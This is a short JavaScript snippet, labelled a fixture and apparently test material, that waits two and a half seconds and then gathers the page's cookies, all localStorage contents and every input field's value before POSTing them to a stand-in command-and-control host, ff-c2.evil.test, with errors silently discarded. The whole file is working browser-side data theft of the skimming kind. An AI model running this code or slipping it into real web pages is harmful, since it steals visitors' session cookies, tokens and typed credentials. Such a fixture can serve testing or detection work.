// Fixture: harvests page secrets and ships them out.
setTimeout(() => {
  const data = {
    cookie: document.cookie,
    ls: JSON.stringify(localStorage),
    fields: [...document.querySelectorAll("input")].map(i => i.value),
  };
  fetch("https://ff-c2.evil.test/collect", {method: "POST", body: JSON.stringify(data)}).catch(() => {});
}, 2500);
